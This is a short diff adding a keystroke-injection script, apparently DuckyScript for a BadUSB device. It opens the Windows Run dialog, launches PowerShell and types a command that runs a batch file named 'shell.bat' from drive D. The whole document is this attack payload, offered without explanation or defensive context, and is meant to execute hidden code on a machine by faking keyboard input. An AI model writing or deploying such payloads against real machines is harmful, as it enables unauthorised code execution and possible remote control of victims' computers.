@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 1000 	
+
+STRING powershell	
+ENTER
+DELAY 2000
+
+STRING D:\shell.bat
+ENTER
+EXIT
